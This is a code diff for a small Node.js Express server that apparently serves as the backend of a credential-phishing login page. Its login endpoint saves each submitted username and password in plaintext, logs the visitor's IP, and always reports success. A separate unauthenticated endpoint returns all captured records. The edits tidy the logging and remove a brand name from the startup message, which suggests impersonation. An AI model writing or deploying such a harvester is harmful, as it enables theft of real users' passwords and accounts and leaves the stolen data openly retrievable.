@@ -23,26 +23,25 @@ function saveRecord(type, username = null, password = null, ip = 'Unknown') {
         [type, username, password, ip, timestamp]);
 }
 
-// Record visits
+// Record every visit (even before login)
 app.get('/', (req, res) => {
-    saveRecord('Homepage Visit', null, null, req.ip || req.headers['x-forwarded-for']);
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    saveRecord('Login Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Login
+// Login Attempt
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for']);
-    console.log('✅ Login Recorded:', username);
+    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.json({ success: true });
 });
 
-// Get records
+// Get all records
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
@@ -60,5 +59,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Alightsmart Server Running`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
